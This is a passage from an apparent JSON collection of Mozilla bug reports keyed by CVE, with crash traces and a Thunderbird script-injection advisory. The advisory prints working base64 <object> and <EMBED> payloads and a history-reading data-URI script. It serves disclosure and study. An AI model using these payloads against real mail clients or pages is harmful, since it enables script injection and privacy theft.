0x7f045e2e2fde in mozilla::MediaDecoder::InitializeStateMachine(mozilla::MediaDecoder*) /build/firefox/src/content/media/MediaDecoderStateMachine.cpp:3025:10 #9 0x7f045e14c73d in mozilla::dom::HTMLMediaElement::FinishDecoderSetup(mozilla::MediaDecoder*, mozilla::MediaResource*, nsIStreamListener**, mozilla::MediaDecoder*) /build/firefox/src/content/html/content/src/HTMLMediaElement.cpp:2659:17 #10 0x7f045e13b388 in mozilla::dom::HTMLMediaElement::InitializeDecoderForChannel(nsIChannel*, nsIStreamListener**) /build/firefox/src/content/html/content/src/HTMLMediaElement.cpp:2607:12 #11 0x7f045e13a0b3 in mozilla::dom::HTMLMediaElement::MediaLoadListener::OnStartRequest(nsIRequest*, nsISupports*) /build/firefox/src/content/html/content/src/HTMLMediaElement.cpp:349:7 #12 0x7f045a33ce42 in mozilla::net::nsHttpChannel::CallOnStartRequest() /build/firefox/src/netwerk/protocol/http/nsHttpChannel.cpp:914:14 #13 0x7f045a348c45 in mozilla::net::nsHttpChannel::ContinueProcessNormal(tag_nsresult) /build/firefox/src/netwerk/protocol/http/nsHttpChannel.cpp:1668:10 #14 0x7f045a34555a in mozilla::net::nsHttpChannel::ProcessNormal() /build/firefox/src/netwerk/protocol/http/nsHttpChannel.cpp:1603:12 #15 0x7f045a344a55 in mozilla::net::nsHttpChannel::ProcessResponse() /build/firefox/src/netwerk/protocol/http/nsHttpChannel.cpp:1513:14 #16 0x7f045a362e4e in mozilla::net::nsHttpChannel::OnStartRequest(nsIRequest*, nsISupports*) /build/firefox/src/netwerk/protocol/http/nsHttpChannel.cpp:5172:20 #17 0x7f0459f73fb6 in nsInputStreamPump::OnStateStart() /build/firefox/src/netwerk/base/src/nsInputStreamPump.cpp:531:14 #18 0x7f0459f734c0 in nsInputStreamPump::OnInputStreamReady(nsIAsyncInputStream*) /build/firefox/src/netwerk/base/src/nsInputStreamPump.cpp:433:25 #19 0x7f0459dac829 in nsInputStreamReadyEvent::Run() /build/firefox/src/xpcom/io/nsStreamUtils.cpp:88:9 #20 0x7f0459de46f6 in nsThread::ProcessNextEvent(bool, bool*) /build/firefox/src/xpcom/threads/nsThread.cpp:830:7 #21 0x7f0459e3aa66 in NS_ProcessNextEvent(nsIThread*, bool) /build/firefox/src/xpcom/glue/nsThreadUtils.cpp:265:10 #22 0x7f045a66c34f in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /build/firefox/src/ipc/glue/MessagePump.cpp:99:21 #23 0x7f045a61c561 in MessageLoop::Run() /build/firefox/src/ipc/chromium/src/base/message_loop.cc:233:3 #24 0x7f045dbd214f in nsBaseAppShell::Run() #25 0x7f04600884f1 in nsAppStartup::Run() /build/firefox/src/toolkit/components/startup/nsAppStartup.cpp:280:19 #26 0x7f0460169c9e in XREMain::XRE_mainRun() /build/firefox/src/toolkit/xre/nsAppRunner.cpp:4095:10 #27 0x7f046016ac86 in XREMain::XRE_main(int, char**, nsXREAppData const*) /build/firefox/src/toolkit/xre/nsAppRunner.cpp:4168:8 #28 0x7f046016bac6 in XRE_main /build/firefox/src/toolkit/xre/nsAppRunner.cpp:4382:16 #29 0x4bf702 in main /build/firefox/src/browser/app/nsBrowserApp.cpp:287:12 #30 0x7f0469a5c76c in __libc_start_main /build/buildd/eglibc-2.15/csu/libc-start.c:226 SUMMARY: AddressSanitizer: stack-buffer-overflow ??:0 ?? Shadow bytes around the buggy address: 0x0fe105c2a5c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0fe105c2a5d0: f1 f1 f1 f1 04 f3 f3 f3 00 00 00 00 00 00 00 00 0x0fe105c2a5e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0fe105c2a5f0: f1 f1 f1 f1 04 f3 f3 f3 00 00 00 00 00 00 00 00 0x0fe105c2a600: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 =>0x0fe105c2a610: 00 00 00 00 f1 f1 f1 f1 01 f2[01]f3 00 00 00 00 0x0fe105c2a620: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0fe105c2a630: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0fe105c2a640: f1 f1 f1 f1 00 00 00 00 00 00 00 00 00 00 00 00 0x0fe105c2a650: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0fe105c2a660: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac ASan internal: fe ==35313==ABORTING"
      }
    ],
    "CVE-2014-1594": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1074280",
        "title": "Bad casting: From BasicThebesLayer to BasicContainerLayer",
        "description": "User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36 Steps to reproduce: Hi Firefox, We have recently developed a runtime detection tool to identify undefined behaviors in static_cast (similar to -fsanitize=object-size/-fsanitize=vptr in Clang, but we improved to find undefined behaviors). Please see our confirmed other bug reports in libstdc++ (https://gcc.gnu.org/bugzilla/show_bug.cgi?id=63345). We have built/run Firefox using our instrumentation tool, and also found several bad castings in Firefox (let us report an issue one by one). ----------------------------------------------------------- // gfx/layers/basic/BasicLayerManager.cpp, // aLayer might not be a container layer, but if so we take care not to use // the container variable BasicContainerLayer* container = static_cast<BasicContainerLayer*>(aLayer); ----------------------------------------------------------- Here, aLayer is pointing to the object allocated as BasicThebesLayer, and it is casted into BasicContainerLayer. However, since BasicContainerLayer is not a subobject of BasicThebesLayer, it is violating C++ standard rules 5.2.9/11--down casting is undefined if the object that the pointer to be casted points to is not a suboject of down casting type-- and causes undefined behaviors. Class layouts for BasicThebesLayer and BasicContainerLayer are attached, and pasted the error reports from our tool. Actual results: == Bad-casting reports /home/blee/project/firefox/firefox/gfx/layers/basic/BasicLayerManager.cpp:800:36: Casting from 'mozilla::layers::BasicThebesLayer' to 'mozilla::layers::BasicContainerLayer' Pointer 0x62a000093d00 Alloc base 0x62a000093d00 User base 0x62a000093d00 Offset 0x000000000000 TypeTable 0x7f3f47d14d40 #0 0x7f3f43edb057 in PaintLayer /home/blee/project/firefox/firefox/gfx/layers/basic/BasicLayerManager.cpp:800 #1 0x7f3f43edbe09 in PaintSelfOrChildren /home/blee/project/firefox/firefox/gfx/layers/basic/BasicLayerManager.cpp:744 #2 0x7f3f43edb2f8 in PaintLayer /home/blee/project/firefox/firefox/gfx/layers/basic/BasicLayerManager.cpp:847 #3 0x7f3f43edbe09 in PaintSelfOrChildren /home/blee/project/firefox/firefox/gfx/layers/basic/BasicLayerManager.cpp:744 #4 0x7f3f43edb2f8 in PaintLayer /home/blee/project/firefox/firefox/gfx/layers/basic/BasicLayerManager.cpp:847 #5 0x7f3f43eda13f in EndTransactionInternal /home/blee/project/firefox/firefox/gfx/layers/basic/BasicLayerManager.cpp:524 #6 0x7f3f450cb55e in PaintFramesWithEffects /home/blee/project/firefox/firefox/layout/svg/nsSVGIntegrationUtils.cpp:544 #7 0x7f3f44f4b073 in PaintInactiveLayer /home/blee/project/firefox/firefox/layout/base/FrameLayerBuilder.cpp:2592 #8 0x7f3f44f4ba8d in DrawThebesLayer /home/blee/project/firefox/firefox/layout/base/FrameLayerBuilder.cpp:4497 #9 0x7f3f43ef325a in PaintBuffer /home/blee/project/firefox/firefox/gfx/layers/basic/BasicThebesLayer.h:116 #10 0x7f3f43ee3001 in Validate /home/blee/project/firefox/firefox/gfx/layers/basic/BasicThebesLayer.cpp:184 #11 0x7f3f43ed90e2 in Validate /home/blee/project/firefox/firefox/gfx/layers/basic/BasicContainerLayer.cpp:128 #12 0x7f3f43ed9feb in EndTransactionInternal /home/blee/project/firefox/firefox/gfx/layers/basic/BasicLayerManager.cpp:493"
      }
    ],
    "CVE-2014-2018": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=875818",
        "title": "HTML compose window XSS via <object> tag on Reply/Forward (\"wiretap\" is back)",
        "description": "Title: ====== Mozilla Thunderbird - 17.0.6 - Base URI Filter Bypass & Persistent Script Code Injection Vulnerability Date: ===== 2013-05-21 References: =========== http://www.vulnerability-lab.com/get_content.php?id=953 VL-ID: ===== 953 Common Vulnerability Scoring System: ==================================== 3.9 Introduction: ============= Thunderbird is a free, open-source, cross-platform application for managing email and news feeds. It is a local (rather than a web-based) email application that is powerful yet easy-to-use. Thunderbird has lots of cool features. Thunderbird gives you control and ownership over your email. There are lots of add-ons available for Thunderbird that enable you to extend and customize your email experience. Thunderbird is part of the Mozilla Manifesto, a pledge that describes Mozilla`s commitment to an open, accessible, egalitarian Internet. Vendor Homepage: http://www.mozilla.org Product website: http://www.mozilla.org/en-US/thunderbird/ Abstract: ========= An independent vulnerability lab researcher discovered a filter bypass and persistent validation vulnerability in the Mozilla Thunderbird Email Software. Report-Timeline: ================ 2013-05-10: Researcher Notification & Coordination (Ateeq Khan) 2013-05-11: Vendor Notification (Mozilla - Security Incident Team) 2013-00-00: Vendor Response/Feedback (Mozilla - Security Incident Team) 2013-00-00: Vendor Fix/Patch (Mozilla - Developer Team) 2013-00-00: Public Disclosure (Vulnerability Laboratory) Status: ======== Unpublished Affected Products: ================== Mozilla Product: Thunderbird - EMail Application 17.0.6 Exploitation-Technique: ======================= Remote Severity: ========= Medium Details: ======== It has been discovered that the security controls / filters currently being used in Mozilla Thunderbird application can be easily evaded if an attacker decides to encrypt the payloads with base64 encryption and combine it with the <object> tag. During the testing, it was initially noticed that malicious javascript tags were being filtered / blocked in the Thunderbird application however, Attaching a debugger with the Thunderbird .exe file revealed some very interesting information and gave much better insight behind the actual working of the application. Most of the information revealed is Javascript errors which gave the researcher much hope in believing that the application might actually be vulnerable. By default, HTML tags like <script> and <iframe> are blocked in Thunderbird and get filtered immediately upon insertion however, While drafting a new email message, attackers can easily bypass the current input filters by encoding their payloads with base64 encryption and using the <object> tag and insert malicious scripts / code eg. (script / frame) within the emails and send it to the victims. The exploit gets triggered once the victim decides to reply back and clicks on the \\'Reply\\' or \\'Forward\\' Buttons. After successfully bypassing the input filters, an attacker can inject persistent script code while writing a new email and send it to victims. Interestingly the payload gets filtered during the initial viewing mode however if the victim clicks on Reply or Forward, the exploit gets executed successfully. For a POC i will be including multiple examples in this advisory for your review. I was able to run multiple scripts generating strange behaviour on the application which can be seen in the debugging errors which I have attached along with this report. These sort of vulnerabilities can result in multiple attack vectors on the client end which may eventually result in complete compromise of the end user system. The persistent code injection vulnerability is located within the main application. Exploitation of this persistent application vulnerability requires a low or medium user interaction. Successful exploitation of the vulnerability may result in malicious script code being executed in the victims browser resulting in script code injection, persistent phishing, Client side redirects and similar client side attacks. Vulnerable Service(s): [+] Mozilla Thunderbird 17.0.6 - Latest Release Vulnerable Section(s): [+] Write (Create a new message) [+] Email Signature (Account Settings) [+] Attach File with Signature as HTML (Account Settings) Proof of Concept: ================= For successful exploitation of this bug, the attacker needs follow the following steps: a) Create a new email message b) In the body text, insert new HTML tag with the POC \"Payload\" c) Send the email to the victim d) Open the new email in the victim browser and click Reply e) You should now see a Javascript Application popup window proving the existence of this vulnerability. Proof of Concept #2 ------------------- a) Goto Tools and then Account Settings b) Under the Signature Text, insert the Payload and enable 'Use HTML' c) Close the menu and Click on \"Write\" to create a new email d) You should get a popup the moment new Email editor window opens up proving the existence of this vulnerability. Proof of Concept #3 ------------------- a) Create a new text file on your desktop (local computer) and insert the POC payload in it and save it as test.html (HTML) b) Goto Tools and then Account Settings c) Below the Signature Text box, enable 'Attach the signature from a file instead' d) Click Choose and select the 'test.html' file which you created in step a. e) Click on Write and you should be able to see the Javascript popup proving the existence of this vulnerability. Payload #1 ---------- <object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgiTW96aWxsYS1UaHVuZGVyYmlyZC1TY3JpcHQtQ29kZS1JbmplY3Rpb24t UE9DLUF0ZWVxLUtoYW4iKTs8L3NjcmlwdD4= \"></object> Payload #2 ---------- <EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDov L3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5 L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIk1vemlsbGEt VGh1bmRlcmJpcmQtU2NyaXB0LUNvZGUtSW5qZWN0aW9uLVBPQy1BdGVlcS1LaGFuIik7PC9zY3Jp cHQ+PC9zdmc+\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED> 1.3 POC Technical Description: -------------------------- Here, we used the data URI payload as a value assigned to the ëdataí attribute of the ëobjectí tag. The <object> tag is used to include objects such as images, audio, videos, Java applets, ActiveX, PDF, and Flash. The ëdataí attribute of the object tag defines a URL that refers to the object's data. Data in the \"data:\" URI is encoded as a base64 string: Base64-encoded payload: PHNjcmlwdD5hbGVydCgiTW96aWxsYS1UaHVuZGVyYmlyZC1TY3JpcHQtQ29kZS1JbmplY3Rpb24tUE9DLUF0ZWVxLUtoYW4iKTs8L3NjcmlwdD4= Base64-decoded payload: <script>alert(\"Mozilla-Thunderbird-Script-Code-Injection-POC-Ateeq-Khan\");</script> When the browser loads the object tag, it loads an object (in our case, itís a javascript) assigned to its data attribute. This causes execution of our javascript. We were able to bypass the application blacklist filter because of the base64-encoded payload. 1.4 Email Header showing the hidden malicious payload ------------------------------------------------- Message-ID: <5195AABB.9000409@ccure.it> Date: Fri, 17 May 2013 08:57:47 +0500 From: Ateeq Khan <ateeq@ccure.it> User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:17.0) Gecko/20130509 Thunderbird/17.0.6 MIME-Version: 1.0 To: ateeq <ateeq@ccure.it> Subject: Test X-Enigmail-Version: 1.5.1 Content-Type: multipart/alternative; boundary=\"------------070707070308040102070208\" X-Provags-ID: V02:K0:x1sxyB72JjArK0t7OpMGlUdnbY0vjneQvJdkX/twIfw QgzRaY5JN/SeFJ/fl2yULg+LJCKojYYGFR/8wrcS9hv6B6WWrN mur6d1IsxEn2D2kZt5fQ3tk8Z1qDiEpN5C7vrtOyEFAMJR3NHg jsL6elL9oxDkDRj1rYWvipndH1vonoPT3kjbcmuPsEZwYZ0JkL BjvA5CQE3qDMPgd5nzdT8SqKBRrj9u7m/irxCWHeJcnAG0XBnK txadh05EhpYjzrsz2kd+EyQe8ABh9F+yHQs6PBgIJeMDhm3EmY KPDb5TDHAsnDSD7e3jSaj1t/jhHWc4OA+Okkw+PsyBasdNvzw= = X-UI-Junk: AutoNotJunk -999 (UWL); V01:9SSPrMSv:3OJduITnBKJW2sO9FDRIJW8REKQH86F2DhxLUWcUUFzS1g0JhJ7 GgRkniiwfqYstxpjhSj957gz/8tEx07A4XeXZriK0TD0WhS1DXezTz/TtZsDYDEh hoWYOFl3bb5yC2QDLQsFZpUW8W11Q1ueL83Jxhvv1UmeH1zGnYFLHhAFOpzxH4jN 652vXWc8dXjmX/WjTrvcI6NDjWdTTTfnDoO2PVFxLR+Tspu5HEv+SDuyrKv18Pei ogK+aeYsHnGw+Sv4tyfEE3I/nLbDefudGihBnld6s0loLxOOAGeIYxOeZ4Je+v0h MH9Y6ICIP7qvG/CkWt1PYQDzeNRPMANzlOgD/c//0kMjpKd6GwFWZIgfLyEFGGGA 5ghpw5skyHXrAcf+FBq4ayJpL2UIfGeghWw== X-Nemesis-Spam: whitelist Envelope-To: ateeq@ccure.it This is a multi-part message in MIME format. --------------070707070308040102070208 Content-Type: text/plain; charset=ISO-8859-1 Content-Transfer-Encoding: 7bit -- --------------070707070308040102070208 Content-Type: text/html; charset=ISO-8859-1 Content-Transfer-Encoding: 7bit <html> <head> <meta http-equiv=\"content-type\" content=\"text/html; charset=ISO-8859-1\"> </head> <body text=\"#000000\" bgcolor=\"#FFFFFF\"> <object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgiTW96aWxsYS1UaHVuZGVyYmlyZC1TY3JpcHQtQ29kZS1JbmplY3Rpb24tUE9DLUF0ZWVxLUtoYW4iKTs8L3NjcmlwdD4= \"></object> <div class=\"moz-signature\">-- <br> <script>alert(1)</script></div> </body> </html> --------------070707070308040102070208-- 1.5 Interesting Raw Application Logs captured during the entire process of testing: ------------------------------------------------------------------------------- (4fbc.3828): Break instruction exception - code 80000003 (first chance) eax=fff82000 ebx=00000000 ecx=00000000 edx=7792f85a esi=00000000 edi=00000000 eip=778a000c esp=0ffffd94 ebp=0ffffdc0 iopl=0 nv up ei pl zr na pe nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000246 ntdll!DbgBreakPoint: 778a000c cc int 3 0:040> g [JavaScript Error: \"Search service falling back to synchronous initialization at SRCH_SVC__ensureInitialized@resource:///components/nsSearchService.js:2498 @resource:///components/nsSearchService.js:3476 _adjustAcItem@chrome://messenger/content/webSearch.xml:42 @chrome://messenger/content/webSearch.xml:22 \" {file: \"resource:///components/nsSearchService.js\" line: 2499}] [JavaScript Error: \"2013-05-18 06:02:42 gloda.datastore ERROR Async queryFromQuery error: 1: malformed MATCH expression: [\"<EMBED\" \"SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDov,L3d3dy53My5vcmcvMjA wMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5\"] \" {file: \"resource:///modules/gloda/log4moz.js\" line: 687}] 2013-05-18 06:02:42 gloda.datastore ERROR Async queryFromQuery error: 1: malformed MATCH expression: [\"<EMBED\" \"SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDov,L3d3dy53My5vcmcvMjA wMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5\"] [JavaScript Error: \"2013-05-18 06:02:42 gloda.datastore ERROR Async queryFromQuery error: 1: malformed MATCH expression: [\"<EMBED\" \"SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDov,L3d3dy53My5vcmcvMjA wMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5\"] \" {file: \"resource:///modules/gloda/log4moz.js\" line: 687}] 2013-05-18 06:02:42 gloda.datastore ERROR Async queryFromQuery error: 1: malformed MATCH expression: [\"<EMBED\" \"SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDov,L3d3dy53My5vcmcvMjA wMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5\"] [JavaScript Error: \"An error occurred executing the cmd_insertHTMLWithDialog command: [Exception... \"Could not convert Native argument arg 3 [nsIDOMJSWindow.openDialog]\" nsresult: \"0x8057000a (NS_ERROR_XPC_BAD_CONVERT_NATIVE)\" location: \"JS frame :: chrome://editor/content/ComposerCommands.js :: <TOP_LEVEL> :: line 2790\" data: no]\" {file: \"chrome://global/content/globalOverlay.js\" line: 95}] [JavaScript Warning: \"XUL box for _moz_generated_content_before element contained an inline #text child, forcing all its children to be wrapped in a block.\" {file: \"chrome://messenger/content/messengercompose/messengercompose.xul\" line: 0}] [JavaScript Warning: \"XUL box for _moz_generated_content_before element contained an inline #text child, forcing all its children to be wrapped in a block.\" {file: \"chrome://messenger/content/messengercompose/messengercompose.xul\" line: 0}] [JavaScript Warning: \"XUL box for _moz_generated_content_before element contained an inline #text child, forcing all its children to be wrapped in a block.\" {file: \"chrome://messenger/content/messengercompose/messengercompose.xul\" line: 0}] [JavaScript Error: \"IndexSizeError: Index or size is negative or greater than the allowed amount\" {file: \"chrome://messenger/content/glodaFacetBindings.xml\" line: 1736}] [JavaScript Error: \"IndexSizeError: Index or size is negative or greater than the allowed amount\" {file: \"chrome://messenger/content/glodaFacetBindings.xml\" line: 1736}] [JavaScript Warning: \"XUL box for _moz_generated_content_before element contained an inline #text child, forcing all its children to be wrapped in a block.\" {file: \"chrome://messenger/content/folderDisplay.js\" line: 2342}] [JavaScript Warning: \"XUL box for _moz_generated_content_before element contained an inline #text child, forcing all its children to be wrapped in a block.\" {file: \"chrome://messenger/content/folderDisplay.js\" line: 2342}] [JavaScript Warning: \"The character encoding of a framed document was not declared. The document may appear different if viewed without the document framing it.\" {file: \"data:text/html;base64,PHNjcmlwdD5hbGVydCgiTW96aWxsYS1UaHVuZGVyYmlyZC1TY3JpcHQtQ29kZS1JbmplY3Rpb24tUE9DLUF0ZWVxLUtoYW4iKTs8L3NjcmlwdD4=\" line: 0}] [JavaScript Error: \"IndexSizeError: Index or size is negative or greater than the allowed amount\" {file: \"chrome://messenger/content/glodaFacetBindings.xml\" line: 1736}] [JavaScript Error: \"IndexSizeError: Index or size is negative or greater than the allowed amount\" {file: \"chrome://messenger/content/glodaFacetBindings.xml\" line: 1736}] [JavaScript Warning: \"The character encoding of a framed document was not declared. The document may appear different if viewed without the document framing it.\" {file: \"data:text/html;base64,PHNjcmlwdD5hbGVydCgiTW96aWxsYS1UaHVuZGVyYmlyZC1TY3JpcHQtQ29kZS1JbmplY3Rpb24tUE9DLUF0ZWVxLUtoYW4iKTs8L3NjcmlwdD4=\" line: 0}] [JavaScript Warning: \"XUL box for _moz_generated_content_before element contained an inline #text child, forcing all its children to be wrapped in a block.\" {file: \"chrome://messenger/content/messenger.xul\" line: 0}] [JavaScript Warning: \"XUL box for _moz_generated_content_before element contained an inline #text child, forcing all its children to be wrapped in a block.\" {file: \"chrome://messenger/content/messenger.xul\" line: 0}] [JavaScript Warning: \"XUL box for _moz_generated_content_before element contained an inline #text child, forcing all its children to be wrapped in a block.\" {file: \"chrome://messenger/content/folderDisplay.js\" line: 1621}] [JavaScript Warning: \"The character encoding of a framed document was not declared. The document may appear different if viewed without the document framing it.\" {file: \"data:text/html;base64,PHNjcmlwdD5hbGVydCgiTW96aWxsYS1UaHVuZGVyYmlyZC1TY3JpcHQtQ29kZS1JbmplY3Rpb24tUE9DLUF0ZWVxLUtoYW4iKTs8L3NjcmlwdD4=\" line: 0}] [JavaScript Warning: \"XUL box for _moz_generated_content_before element contained an inline #text child, forcing all its children to be wrapped in a block.\" {file: \"chrome://messenger/content/messengercompose/messengercompose.xul\" line: 0}] [JavaScript Warning: \"XUL box for _moz_generated_content_before element contained an inline #text child, forcing all its children to be wrapped in a block.\" {file: \"chrome://messenger/content/messengercompose/messengercompose.xul\" line: 0}] [JavaScript Warning: \"XUL box for _moz_generated_content_before element contained an inline #text child, forcing all its children to be wrapped in a block.\" {file: \"chrome://global/content/bindings/toolbar.xml\" line: 276}] \"chrome://global/content/bindings/general.xml\" line: 0}] [JavaScript Warning: \"XUL box for _moz_generated_content_before element contained an inline #text child, forcing all its children to be wrapped in a block.\" {file: \"chrome://messenger/content/messengercompose/messengercompose.xul\" line: 0}] [JavaScript Warning: \"XUL box for _moz_generated_content_before element contained an inline #text child, forcing all its children to be wrapped in a block.\" {file: \"chrome://messenger/content/messengercompose/messengercompose.xul\" line: 0}] No chrome package registered for chrome://navigator/content/navigator.xul [JavaScript Error: \"NS_ERROR_FAILURE: Component returned failure code: 0x80004005 (NS_ERROR_FAILURE) [nsIDOMJSWindow.open]\" {file: \"data:text/html;base64, PFNDUklQVD4KdmFyIHdpbiA9IHdpbmRvdy5vcGVuKCk7Cm5ldHNjYXBlLnNlY3VyaXR5LlByaXZpbGVnZU1hbmFnZXIuZW5hYmxlUHJpdmlsZWdlKAogIlVuaXZlcnNhbEJyb3dzZXJBY2Nlc3MiKTsKZm9 yICh2YXIgaT0wOyBpIDwgaGlzdG9yeS5sZW5ndGg7IGkrKykgewogd2luLmRvY3VtZW50LndyaXRlbG4oaGlzdG9yeVtpXSArICI8QlI+Iik7Cn0KbmV0c2NhcGUuc2VjdXJpdHkuUHJpdmlsZWdlTWFuYW dlci5yZXZlcnRQcml2aWxlZ2UoCiAiVW5pdmVyc2FsQnJvd3NlckFjY2VzcyIpOwp3aW4uY2xvc2UoKTsKPC9TQ1JJUFQ+\" line: 2}] [JavaScript Warning: \"XUL box for _moz_generated_content_before element contained an inline #text child, forcing all its children to be wrapped in a block.\" {file: \"chrome://messenger/content/messengercompose/messengercompose.xul\" line: 0}] [JavaScript Warning: \"XUL box for _moz_generated_content_before element contained an inline #text child, forcing all its children to be wrapped in a block.\" {file: \"chrome://messenger/content/messengercompose/messengercompose.xul\" line: 0}] No chrome package registered for chrome://navigator/content/navigator.xul [JavaScript Error: \"NS_ERROR_FAILURE: Component returned failure code: 0x80004005 (NS_ERROR_FAILURE) [nsIDOMJSWindow.open]\" {file: \"data:text/html;base64, PFNDUklQVD4KdmFyIHdpbiA9IHdpbmRvdy5vcGVuKCk7Cm5ldHNjYXBlLnNlY3VyaXR5LlByaXZpbGVnZU1hbmFnZXIuZW5hYmxlUHJpdmlsZWdlKAogIlVuaXZlcnNhbEJyb3dzZXJBY2Nlc3MiKTsKZm9y ICh2YXIgaT0wOyBpIDwgaGlzdG9yeS5sZW5ndGg7IGkrKykgewogd2luLmRvY3VtZW50LndyaXRlbG4oaGlzdG9yeVtpXSArICI8QlI+Iik7Cn0KbmV0c2NhcGUuc2VjdXJpdHkuUHJpdmlsZWdlTWFuYWdl ci5yZXZlcnRQcml2aWxlZ2UoCiAiVW5pdmVyc2FsQnJvd3NlckFjY2VzcyIpOwp3aW4uY2xvc2UoKTsKPC9TQ1JJUFQ+\" line: 2}] [JavaScript Error: \"An error occurred executing the cmd_insertHTMLWithDialog command: [Exception... \"Could not convert Native argument arg 3 [nsIDOMJSWindow.openDialog]\" nsresult: \"0x8057000a (NS_ERROR_XPC_BAD_CONVERT_NATIVE)\" location: \"JS frame :: chrome://editor/content/ComposerCommands.js :: <TOP_LEVEL> :: line 2790\" data: no]\" {file: \"chrome://global/content/globalOverlay.js\" line: 95}] [JavaScript Warning: \"XUL box for _moz_generated_content_before element contained an inline #text child, forcing all its children to be wrapped in a block.\" {file: \"chrome://messenger/content/messengercompose/messengercompose.xul\" line: 0}] Security Error: Content at moz-nullprincipal:{37db781d-d6d3-44bb-ade4-a79dcc63c0dd} may not load or link to about:blank. Security Error: Content at moz-nullprincipal:{44bab10a-4bd8-4cfb-a519-eb2535344039} may not load or link to about:blank [JavaScript Error: \"[Exception... \"'DB failed getting form autocomplete values' when calling method: [nsIFormAutoComplete::autoCompleteSearch]\" nsresult: \"0x8057001e (NS_ERROR_XPC_JS_THREW_STRING)\" location: \"<unknown>\" data: no]\"] [JavaScript Error: \"aSubject.popup is undefined\" {file: \"resource:///modules/glodaWebSearch.js\" line: 68}] [JavaScript Warning: \"The stylesheet data:,*%7bx:<script>alert(1)</script>askjn</h1>expression(write(2))%7D was loaded as CSS even though its MIME type, \"text/plain\", is not \"text/css\".\" {file: \"about:blank\" line: 0}] [JavaScript Warning: \"Unknown property 'x'. Declaration dropped.\" {file: \"data:,*%7bx:<script>alert(1)</script>askjn</h1>expression(write(2))%7D\" line: 1] [JavaScript Error: \"GenericSendMessage FAILED: [Exception... \"Component returned failure code: 0x8055311a [nsIMsgCompose.SendMsg]\" nsresult: \"0x8055311a (<unknown>)\" location: \"JS frame :: chrome://messenger/content/messengercompose/MsgComposeCommands.js :: GenericSendMessage :: line 2814\" data: no]\" {file: \"chrome://messenger/content/messengercompose/MsgComposeCommands.js\" line: 2817}] \"chrome://messenger/content/messengercompose/messengercompose.xul\" line: 0}] [JavaScript Warning: \"Use of attributes' nodeValue attribute is deprecated. Use value instead.\" {file: \"chrome://messenger/content/messengercompose/MsgComposeCommands.js\" line: 3996}] Security Error: Content at moz-nullprincipal:{549c3f5a-560d-4469-9b0f-09f598998b0b} may not load or link to about:blank. Security Error: Content at moz-nullprincipal:{63e416e7-9cc4-458f-b93d-882bb2ad9121} may not load or link to about:blank. [JavaScript Warning: \"XUL box for _moz_generated_content_before element contained an inline #text child, forcing all its children to be wrapped in a block.\" {file: \"chrome://global/content/bindings/general.xml\" line: 0}] [JavaScript Error: \"Search service falling back to synchronous initialization at SRCH_SVC__ensureInitialized@resource:///components/nsSearchService.js:2498 @resource:///components/nsSearchService.js:3476 _adjustAcItem@chrome://messenger/content/webSearch.xml:42 @chrome://messenger/content/webSearch.xml:22 ----------------------------------------------------------------------------- [JavaScript Warning: \"The stylesheet data:,*%7bx:<script>alert(1)</script>askjn</h1>expression(write(2))%7D was loaded as CSS even though its MIME type, \"text/plain\", is not \"text/css\".\" {file: \"about:blank\" line: 0}] stylesheet was loaded successfully as text/plain even though it should have been. Risk: ===== The security risk of the persistent input validation vulnerabilities are estimated as medium(+). Credits: ======== Ateeq Khan - CCURE IT (ateek.khan@gmail.com) - (Communication: admin@vulnerability-lab.com) Disclaimer: =========== The information provided in this advisory is provided as it is without any warranty. 